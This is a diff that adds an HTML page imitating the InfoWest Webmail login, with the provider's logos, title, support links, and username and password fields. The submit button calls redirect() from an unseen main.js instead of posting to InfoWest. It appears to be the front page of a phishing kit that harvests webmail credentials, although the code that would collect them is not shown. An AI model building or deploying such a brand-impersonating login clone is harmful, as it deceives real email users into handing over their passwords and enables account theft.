@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/remixicon/4.2.0/remixicon.min.css"/>
+    <link rel="stylesheet" href="style.css">
+    <title>InfoWest Webmail :: Welcome to InfoWest Webmail</title>
+</head>
+<body>
+    <div class="pt-20 px-2">
+        <form action="" class="max-w-sm mx-auto" id="form">
+                <div class="flex items-center flex-col pb-6">
+                    <div class="md:hidden absolute bg-white  w-50 h-26">
+                        <img src="img/InfoWestLogo-webmail-2012-sm.png" class="pl-12 pt-12" alt="">
+                        </div>
+                    <img src="img/InfoWestLogo-webmail-2012.png" alt="" class="">
+                    
+                </div>
+                <div class="mt-1">
+                    <div class="flex items-center">
+                        <label for=""><i class="rounded-l-md ri-user-fill text-lg px-4 py-4 text-black border border-gray-300 bg-[#F1F3F4]"></i></label>
+                        <input id="username" required placeholder="Username" type="text" class="focus:outline-none pl-3 placeholder:font-normal shadow-sm focus:ring-1 focus:ring-[#1EB6FF] placeholder:text-lg placeholder:text-gray-400 w-full py-3 border border-gray-300 bg-[#FFFFFF]">
+                    </div>
+
+                    <div class="flex items-center mt-2">
+                        <label for=""><i class="ri-git-repository-private-fill text-lg px-4 rounded-l-md py-4 text-black border border-gray-300 bg-[#F1F3F4]"></i></i></label>
+                        <input id="password" required type="Password" placeholder="Password" class="focus:outline-none pl-3 placeholder:font-normal shadow-sm focus:ring-1 focus:ring-[#1EB6FF] placeholder:text-lg placeholder:text-gray-400 w-full py-3 border border-gray-300 bg-[#FFFFFF]">
+                    </div>
+                </div>
+
+            <div class="flex justify-center mt-2">
+                <button type="submit" onclick="redirect()" class="w-full bg-[#1eb6ff] py-2 text-white text-lg uppercase rounded-md">Login</button>
+            </div>
+            <p class="mt-2 text-center text-gray-500">InfoWest Webmail<a href="https://infowest.com/" class="text-[#1eb6ff] text-sm"> <span class="text-2xl font-bold text-black">.</span> Get Support</a></p>
+        </form>
+        <p class="lg:text-nowrap mt-2 text-center tracking-tighter text-sm">Webmail for AWI domains (awinets.com, skyviewmail.com, lansrc.com, etc) is found at:<a href="https://webmail.awinetworks.com/mail/" class="text-[#1eb6ff] text-sm"> webmail.awinetworks.com</a></p>
+    </div>
+
+
+    <script src="main.js"></script>
+</body>
+</html>
